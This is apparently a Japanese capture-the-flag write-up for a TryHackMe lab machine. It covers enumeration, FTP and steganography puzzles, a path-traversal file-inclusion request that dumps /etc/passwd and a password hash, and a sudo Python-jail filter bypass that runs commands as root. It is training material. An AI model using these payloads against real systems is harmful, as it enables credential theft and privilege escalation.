# Tokyo Ghoul CTF

https://tryhackme.com/room/tokyoghoul666

## Enumeration

```shell
TARGET=10.201.117.58
sudo bash -c "echo $TARGET   tokyo.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sC -sV -p21,22,80 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.201.44.249
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
MAC Address: 16:FF:CD:77:1B:7D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP, SSH, HTTP

### http

index。FTPを見ろというヒント。

```html
<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->
```

help him

```html
<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->
```

### FTP

anonymousで3ファイル入手。

```sh
$ ls -al        
total 80
drwxrwxr-x 2 kali kali  4096 Oct 24 10:11 .
drwxrwxr-x 6 kali kali  4096 Oct 24 10:10 ..
-rw-rw-r-- 1 kali kali   480 Jan 24  2021 Aogiri_tree.txt
-rw-rw-r-- 1 kali kali 17488 Jan 24  2021 need_to_talk
-rw-rw-r-- 1 kali kali 46674 Jan 24  2021 rize_and_kaneki.jpg
```

原作を知らないためかよくわからないテキスト。

```txt
$ cat ./Aogiri_tree.txt 
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will. 
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```

ELF64バイナリ

```sh
$ file ./need_to_talk 
./need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
```

バイナリをリバースしたらパスワードが簡単に判明した。入力したらパスフレーズができた。

```sh
$ ./need_to_talk 
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> [REDACTED]
Good job. I believe this is what you came for:
[REDACTED]
```

入手したパスフレーズを使い、jpgからテキストを取り出す。

```sh
$ steghide extract -sf ./rize_and_kaneki.jpg 
Enter passphrase: 
wrote extracted data to "yougotme.txt".
```

モールス信号。

```sh
$ cat ./yougotme.txt      
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
[REDACTED]

if you can talk it allright you got my secret directory
```

[自作ツール](https://github.com/tacores/ctf-tools/blob/main/morse.py)でモールス信号を解読

```sh
$ cat ./morse.txt | python ./morse.py
5A444679[REDACTED]
```

hex2ascii -> base64 デコードで秘密のURLが出てきた。アクセスするとこのテキストとGIFアニメ画像。

```
Scan me scan me scan all my ideas aaaaahhhhhhhh
```

### ディレクトリ列挙

/claim ディレクトリを発見。アクセスすると未発見のページが表示された。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://tokyo.thm/d1r3c70ry_center/ -w ./dirlist.txt -t 64 -k

...
/claim                (Status: 301) [Size: 323] 
...
```

index.php に LFI の臭いがする。

```html
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
```

GET /d1r3c70ry_center/claim/index.php?view=index.html のようにすると、画面の下にメインページの内容が表示されるので、LFIの脆弱性がある。

GET /d1r3c70ry_center/claim/index.php?view=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd の形で成功。

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
statd:x:110:65534::/var/lib/nfs:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
kamishiro:$6$Tb/euw[REDACTED]:1001:1001:,,,:/home/kamishiro:/bin/bash
```

kamishiro のパスワードハッシュが含まれていた。  
hashcatでクラックでき、SSH接続可能になった。

## 権限昇格

```sh
kamishiro@vagrant:~$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Jan 23  2021 .
drwxr-xr-x 4 root root 4096 Jan 23  2021 ..
-rw-r--r-- 1 root root  588 Jan 23  2021 jail.py
-rw-r--r-- 1 root root   33 Jan 23  2021 user.txt
```

pythonのexecを使ったスクリプト。

```python
kamishiro@vagrant:~$ cat jail.py
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

sudo で上記のPythonスクリプトを実行できる。

```sh
kamishiro@vagrant:~$ sudo -l
[sudo] password for kamishiro: 
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

フィルターバイパスの要領で小文字を回避する。

```sh
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
[sudo] password for kamishiro: 
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
[REDACTED]
No Kaneki you are so dead
```

## 振り返り

- 程よい難易度。原作を見たことないのでモチーフはよく分からなかった。
- 最後のフィルターバイパスはどこかで学んだことがあるがすぐに思い出せなかった。良い復習になった。
